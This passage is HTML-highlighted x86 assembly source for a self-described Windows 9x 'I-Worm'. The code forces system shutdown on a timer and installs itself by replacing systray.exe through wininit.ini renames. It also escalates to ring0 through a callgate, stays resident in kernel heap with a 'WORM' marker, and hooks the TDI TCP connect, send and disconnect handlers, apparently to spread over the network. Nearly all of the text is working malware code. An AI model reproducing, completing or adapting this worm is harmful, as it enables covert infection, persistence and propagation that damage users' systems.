        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rect</span><span class="sc4">+</span><span class="sc5">RECT.bottom</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rect</span><span class="sc4">+</span><span class="sc5">RECT.top</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rect</span><span class="sc4">+</span><span class="sc5">RECT.right</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rect</span><span class="sc4">+</span><span class="sc5">RECT.left</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rect</span><span class="sc4">+</span><span class="sc5">RECT.top</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">y</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rect</span><span class="sc4">+</span><span class="sc5">RECT.left</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hWnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MoveWindow</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rect</span><span class="sc4">+</span><span class="sc5">RECT.right</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1014</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">.dec_x</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rect</span><span class="sc4">+</span><span class="sc5">RECT.left</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">.inc_x</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.done_x</span><span class="sc0">
</span><span class="sc5">.dec_x</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">x</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">step</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.done_x</span><span class="sc0">
</span><span class="sc5">.inc_x</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">x</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">step</span><span class="sc0">
</span><span class="sc5">.done_x</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rect</span><span class="sc4">+</span><span class="sc5">RECT.bottom</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">758</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">.dec_y</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rect</span><span class="sc4">+</span><span class="sc5">RECT.top</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">.inc_y</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.done_y</span><span class="sc0">
</span><span class="sc5">.dec_y</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">y</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">step</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.done_y</span><span class="sc0">
</span><span class="sc5">.inc_y</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">y</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">step</span><span class="sc0">
</span><span class="sc5">.done_y</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">WndProc.Exit</span><span class="sc0">

</span><span class="sc5">.timer_2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">EWX_SHUTDOWN</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitWindowsEx</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">WndProc.Exit</span><span class="sc0">


</span><span class="sc5">Destroy_Handler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PostQuitMessage</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">WndProc.Exit</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">WndProc.DefMsgHandler</span><span class="sc0">




</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  Here starts the part witch makes this an I-Worm</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">iworm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc1">; encode in base64 the file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">my_path</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">systray_ornot</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.not_systray</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.systray</span><span class="sc0">

</span><span class="sc5">.not_systray</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; it isn't installed in the system, so install it</span><span class="sc0">
        </span><span class="sc1">; copy myself into 'systray.me'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.me</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">my_path</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyFileA</span><span class="sc0">

        </span><span class="sc1">; write wininit.ini, so next time windows will start it will</span><span class="sc0">
        </span><span class="sc1">; rename systray.exe into systray.sys and systray.me into systray.exe</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">wininit.ini</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.exe</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.sys</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">rename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">wininit.ini</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.me</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.exe</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">rename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x00000030</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">msgCaption</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">msgContent</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.systray_over</span><span class="sc0">

</span><span class="sc5">.systray</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; run the original systray.exe (systray.sys)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.sys</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WinExec</span><span class="sc0">

</span><span class="sc5">.systray_over</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;  signature</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC000E990</span><span class="sc0">         </span><span class="sc1">; check if already there</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'WORM'</span><span class="sc0">

        </span><span class="sc1">;  if not resident, goto not_res</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_res</span><span class="sc0">

        </span><span class="sc1">;  else get out</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">out_of_here</span><span class="sc0">

</span><span class="sc5">not_res</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;  jump into ring0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Ring0Proc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">callgate</span><span class="sc0">

        </span><span class="sc1">; free the allocated mem</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_encode</span><span class="sc0">

</span><span class="sc5">out_of_here</span><span class="sc4">:</span><span class="sc1">; job done, time to let it go</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  Ring0Proc</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Ring0Proc</span><span class="sc0">   </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc1">; calculate code size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">end</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x100</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">codesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; alloc mem for encoded file</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">_HeapAllocate</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">encoded_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">HEAPZEROINIT</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap_enc_addr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; copy it there</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">encoded_addr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">encoded_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; alloc some memory</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_GetHeap</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">codesize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">codeaddr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; copy the code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">codesize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; make the hooks and stay in there</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">codeaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">heap_code</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc9">.exit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">; time to say good bye</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  This code will be executed only in heap</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">heap_code</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC000E990</span><span class="sc0">         </span><span class="sc1">; mark "already there"</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'WORM'</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TdiHook</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  TdiHook</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">TdiHook</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">; now i need to hook the TDI functions i need</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">codeaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

        </span><span class="sc1">; Make sure VTDI is present</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">VTDI_Get_Version</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">.cont_1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">
</span><span class="sc5">.cont_1</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; Get a pointer to TCP dispatch table</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TCPName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">VTDI_Get_Info</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc1">; Save the address of dispatch table</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiDispatchTable</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc1">; if error get out</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.cont_2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">.exit</span><span class="sc0">
</span><span class="sc5">.cont_2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; ---------- Hook TdiConnect ----------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiConnect_PrevAddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; patch some things in it</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiConnect_Jmp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiConnect_Delta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">codeaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiConnect_Hook</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; ---------- Hook TdiSend ----------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x2C</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiSend_PrevAddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; patch some things in it</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiSend_Jmp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiSend_Delta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">codeaddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiSend_Hook</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x2C</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; ---------- Hook TdiDisconnect ----------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x1C</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiDisconnect_PrevAddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; patch some things in it</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TdiDisconnect_Jmp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

